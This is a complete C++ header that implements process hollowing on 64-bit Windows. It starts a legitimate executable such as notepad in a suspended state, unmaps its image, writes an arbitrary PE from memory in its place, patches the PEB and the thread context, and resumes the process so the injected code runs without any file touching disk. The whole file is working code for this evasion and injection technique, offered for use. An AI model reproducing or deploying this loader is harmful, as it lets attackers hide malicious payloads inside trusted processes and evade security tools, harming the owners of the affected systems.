#pragma once
/*
 * mem_exec.h - Execute a PE from memory via process hollowing.
 * No file is ever written to disk.
 *
 * Flow:
 *   1. CreateProcess(host, SUSPENDED)
 *   2. Unmap original image
 *   3. Allocate at PE preferred base (or relocate)
 *   4. Write PE headers + sections
 *   5. Update PEB->ImageBaseAddress
 *   6. Set entry point in thread context
 *   7. ResumeThread
 */
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <string>

// NtUnmapViewOfSection is not in standard headers
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

namespace MemExec {

// Run a PE image from a memory buffer. Returns process handle on success.
// hostExe: path to a legitimate 64-bit exe to hollow (e.g., current exe or notepad)
// peData: raw PE bytes in memory
// cmdLine: command line to pass to the new process
// outPid: receives the PID of the created process
inline HANDLE RunPEFromMemory(const wchar_t* hostExe,
                               const uint8_t* peData, size_t peSize,
                               const wchar_t* cmdLine,
                               DWORD* outPid = nullptr) {
    if (!peData || peSize < sizeof(IMAGE_DOS_HEADER))
        return nullptr;

    // Validate PE
    auto* dosHeader = (IMAGE_DOS_HEADER*)peData;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return nullptr;

    auto* ntHeaders = (IMAGE_NT_HEADERS64*)(peData + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
        return nullptr;

    if (ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
        return nullptr;

    ULONGLONG preferredBase = ntHeaders->OptionalHeader.ImageBase;
    DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    DWORD entryRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;

    // Build command line buffer (CreateProcessW needs writable)
    std::wstring cmdBuf;
    if (cmdLine && cmdLine[0]) {
        cmdBuf = L"\"";
        cmdBuf += hostExe;
        cmdBuf += L"\" ";
        cmdBuf += cmdLine;
    } else {
        cmdBuf = L"\"";
        cmdBuf += hostExe;
        cmdBuf += L"\"";
    }

    // 1. Create suspended process
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(hostExe, (LPWSTR)cmdBuf.c_str(), nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        return nullptr;
    }

    // 2. Get thread context to find PEB and image base
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return nullptr;
    }

    // Read PEB to get original image base
    ULONGLONG pebImageBaseOffset = ctx.Rdx + 0x10; // PEB->ImageBaseAddress at offset 0x10
    ULONGLONG origImageBase = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)pebImageBaseOffset, &origImageBase, sizeof(origImageBase), nullptr);

    // 3. Unmap original image
    auto NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection) {
        NtUnmapViewOfSection(pi.hProcess, (PVOID)origImageBase);
    }

    // 4. Allocate memory at preferred base
    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, (LPVOID)preferredBase,
                                        imageSize, MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    bool needsReloc = false;
    if (!remoteBase) {
        // Preferred base unavailable, allocate anywhere and relocate
        remoteBase = VirtualAllocEx(pi.hProcess, nullptr, imageSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) {
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return nullptr;
        }
        needsReloc = true;
    }

    // 5. Build the image in a local buffer (headers + sections)
    std::vector<uint8_t> localImage(imageSize, 0);
    
    // Copy headers
    memcpy(localImage.data(), peData, ntHeaders->OptionalHeader.SizeOfHeaders);

    // Copy sections
    auto* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData > 0 && sectionHeader[i].PointerToRawData > 0) {
            if (sectionHeader[i].PointerToRawData + sectionHeader[i].SizeOfRawData <= peSize) {
                memcpy(localImage.data() + sectionHeader[i].VirtualAddress,
                       peData + sectionHeader[i].PointerToRawData,
                       sectionHeader[i].SizeOfRawData);
            }
        }
    }

    // 6. Apply relocations if base differs
    if (needsReloc || (ULONGLONG)remoteBase != preferredBase) {
        ULONGLONG delta = (ULONGLONG)remoteBase - preferredBase;
        auto& relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.VirtualAddress && relocDir.Size) {
            DWORD relocOffset = relocDir.VirtualAddress;
            while (relocOffset < relocDir.VirtualAddress + relocDir.Size) {
                auto* block = (IMAGE_BASE_RELOCATION*)(localImage.data() + relocOffset);
                if (!block->SizeOfBlock || !block->VirtualAddress) break;
                
                DWORD entryCount = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* entries = (WORD*)((uint8_t*)block + sizeof(IMAGE_BASE_RELOCATION));
                
                for (DWORD e = 0; e < entryCount; e++) {
                    WORD type = entries[e] >> 12;
                    WORD offset = entries[e] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG* patchAddr = (ULONGLONG*)(localImage.data() + block->VirtualAddress + offset);
                        *patchAddr += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* patchAddr = (DWORD*)(localImage.data() + block->VirtualAddress + offset);
                        *patchAddr += (DWORD)delta;
                    }
                    // IMAGE_REL_BASED_ABSOLUTE (0) = skip/padding
                }
                relocOffset += block->SizeOfBlock;
            }
        }

        // Update ImageBase in the local copy's NT headers
        auto* localDos = (IMAGE_DOS_HEADER*)localImage.data();
        auto* localNt = (IMAGE_NT_HEADERS64*)(localImage.data() + localDos->e_lfanew);
        localNt->OptionalHeader.ImageBase = (ULONGLONG)remoteBase;
    }

    // 7. Write the full image into the remote process
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteBase, localImage.data(), imageSize, &written)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return nullptr;
    }

    // 8. Update PEB->ImageBaseAddress to our new base
    ULONGLONG newBase = (ULONGLONG)remoteBase;
    WriteProcessMemory(pi.hProcess, (LPVOID)pebImageBaseOffset, &newBase, sizeof(newBase), nullptr);

    // 9. Set entry point: RCX = entry point address
    ctx.Rcx = (ULONGLONG)remoteBase + entryRVA;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return nullptr;
    }

    // 10. Resume!
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);

    if (outPid)
        *outPid = pi.dwProcessId;

    return pi.hProcess;
}

} // namespace MemExec
